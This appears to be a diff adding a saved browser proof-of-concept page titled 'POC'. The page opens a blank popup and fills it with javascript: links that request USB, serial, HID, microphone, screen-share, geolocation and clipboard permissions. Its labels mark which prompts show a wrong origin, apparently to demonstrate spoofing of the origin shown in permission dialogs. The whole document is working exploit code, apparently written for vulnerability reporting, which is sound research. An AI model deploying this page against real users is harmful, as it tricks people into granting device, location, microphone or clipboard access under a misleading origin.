@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<!-- saved from url=(0071)https://transcendent-custard-cd5aab.netlify.app/permissionoriginsp.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>POC</title>
+</head>
+<body>
+  <button onclick="openPopup()">Open Popup</button>
+
+  <script>
+    function openPopup() {
+      const newWindow = window.open("about:blank");
+        //alert();
+      const usbCode = "javascript: navigator.usb.requestDevice({filters:[]});";
+      const audioCode = "javascript: navigator.mediaDevices.getUserMedia({audio: true});";
+      const serialCode = "javascript: navigator.serial.requestPort({filters:[]});";
+      const hidCode = "javascript: navigator.hid.requestDevice({filters: []});";
+      const shareScrCode = "javascript: navigator.mediaDevices.getDisplayMedia();"; 
+           const geolocationCode = `
+        javascript:
+        navigator.geolocation.getCurrentPosition(position => {
+          const p = document.createElement('p');
+          p.textContent = 'Latitude: ' + position.coords.latitude + ', Longitude: ' + position.coords.longitude;
+          document.body.appendChild(p);
+        }, error => {
+          console.log('Error getting geolocation:', error);
+        });
+      `;
+      
+      const clipboardWriteCode = "javascript: navigator.clipboard.writeText('Hello, Clipboard!');";
+      
+      const clipboardReadCode = `
+        javascript: 
+        navigator.clipboard.readText().then(data => {
+          const p = document.createElement('p');
+          p.textContent = 'Clipboard Content: ' + data;
+          document.body.appendChild(p);
+        });
+      `;
+      newWindow.document.body.innerHTML = `
+        <a href="${usbCode}">Wrong (USB)</a> <b>this permission shows the correct origin in Android</b><br>
+        <a href="${serialCode}">Wrong (Serial)</a><br>
+        <a href="${hidCode}">Wrong (HID)</a><br>
+         <a href="${audioCode}">Normal (Audio)</a><br>
+          <a href="${shareScrCode}">Normal (ShareScr)</a><br>
+          <a href="${geolocationCode}">Normal (GeoCode)</a><br>
+         <a href="${clipboardReadCode}">Normal (Clipboard Read)</a><br>
+        <a href="${clipboardWriteCode}">Click Me (Clipboard Write)</a><br>
+
+      `;
+      newWindow.focus();
+    }
+  </script>
+
+
+</body></html>
